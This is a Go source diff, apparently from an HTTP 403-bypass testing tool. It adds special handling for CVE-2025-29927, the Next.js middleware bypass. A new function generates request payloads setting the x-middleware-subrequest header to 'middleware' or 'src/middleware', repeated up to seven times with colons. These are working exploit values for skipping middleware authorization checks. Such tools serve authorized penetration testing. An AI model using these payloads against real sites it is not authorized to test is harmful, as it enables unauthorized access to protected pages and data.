@@ -28,6 +28,11 @@ For each header name, it creates multiple payload variations:
   - Header Value: Full URL constructed with parent path (if header name suggests URL context).
   - Header Value: Full URL constructed with parent path + original query string (if header name suggests URL context and query exists).
 
+3.  **Special CVE-2025-29927 Handling**
+  - For X-Middleware-Subrequest header:
+  - Special values like "middleware", "middleware:middleware", etc. up to 6-7 repetitions
+  - Also variations with "src/middleware", "src/middleware:src/middleware", etc.
+
 The original URL's method, scheme, and host are preserved in the base structure,
 while the RawURI and Headers fields are manipulated according to the variations above.
 */
@@ -73,6 +78,12 @@ func (pg *PayloadGenerator) GenerateHeadersURLPayloads(targetURL string, bypassM
 	}
 
 	for _, headerURL := range headerURLs {
+		// Special handling for CVE-2025-29927 middleware subrequest
+		if strings.EqualFold(headerURL, "x-middleware-subrequest") {
+			allJobs = append(allJobs, generateMiddlewareSubrequestPayloads(baseJob, fullPathWithQuery)...)
+			continue // Skip standard handling for this header
+		}
+
 		// First variant: base_path in header (don't add query to header)
 		job := baseJob
 		job.RawURI = "/"
@@ -171,4 +182,39 @@ func (pg *PayloadGenerator) GenerateHeadersURLPayloads(targetURL string, bypassM
 
 	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payloads for %s\n", len(allJobs), targetURL)
 	return allJobs
+}
+
+// generateMiddlewareSubrequestPayloads creates special payloads for CVE-2025-29927 middleware subrequest bypass
+func generateMiddlewareSubrequestPayloads(baseJob BypassPayload, fullPathWithQuery string) []BypassPayload {
+	var middlewarePayloads []BypassPayload
+
+	// Define the two base values for the middleware
+	baseValues := []string{"middleware", "src/middleware"}
+
+	for _, baseValue := range baseValues {
+		// Generate payloads with single value
+		job := baseJob
+		job.RawURI = fullPathWithQuery
+		job.Headers = []Headers{{
+			Header: "x-middleware-subrequest",
+			Value:  baseValue,
+		}}
+		job.PayloadToken = GeneratePayloadToken(job)
+		middlewarePayloads = append(middlewarePayloads, job)
+
+		// Generate payloads with 2-7 repetitions of the value, joined by colons
+		for repeats := 2; repeats <= 7; repeats++ {
+			repeated := strings.Repeat(baseValue+":", repeats-1) + baseValue
+			job := baseJob
+			job.RawURI = fullPathWithQuery
+			job.Headers = []Headers{{
+				Header: "x-middleware-subrequest",
+				Value:  repeated,
+			}}
+			job.PayloadToken = GeneratePayloadToken(job)
+			middlewarePayloads = append(middlewarePayloads, job)
+		}
+	}
+
+	return middlewarePayloads
 }
